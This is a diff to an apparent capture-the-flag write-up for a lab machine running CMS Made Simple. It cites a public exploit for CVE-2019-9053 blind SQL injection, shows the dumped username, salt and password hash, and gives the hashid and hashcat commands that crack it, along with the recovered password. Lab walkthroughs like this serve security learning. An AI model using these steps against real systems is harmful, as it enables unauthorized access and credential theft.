@@ -36,10 +36,47 @@ Visiting key pages such as robots.txt gave the following directory in the Disall
 
 ![image](https://github.com/user-attachments/assets/8ac080cd-bab5-417d-b1ad-0dae52a77827)
 
-The source code shows this is running [CMS Made Simple](https://www.cmsmadesimple.org/), an open source Content Management System. 
+The source code shows this is running [CMS Made Simple](https://www.cmsmadesimple.org/), an open source Content Management System, the copyright gives us a clue this version is from 2019. 
 
 ```html
 <base href="http://10.129.229.158/writeup/" />
 <meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 ```
+
+Browsing Google for vulnerabilities in CMS made simple shows [CVE-2019-9053](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9053) from 2019. This is a blind SQL vulnerability with a [public exploit](https://www.exploit-db.com/exploits/46635).  
+
+Download the script and make the very basic alterations to get it working. Running the script finds the following information:
+
+```bash
+[+] Salt for password found: 1
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+```
+
+The password looks like an MD5 hash which hashid all but confirms by returning MD2, MD5 and MD4 as the top 3 likely hash algorithms. 
+
+```bash
+hashid 62def4866937f08cc13bab43bb14e6f7
+
+Analyzing '62def4866937f08cc13bab43bb14e6f7'
+[+] MD2 
+[+] MD5 
+[+] MD4 
+```
+
+Running the hash through hachcat crack it and gives us the users password
+
+```bash
+hash
+hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
+
+<--snip-->
+
+62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
+
+<--snip-->
+```
+
+Password : raykayjay9
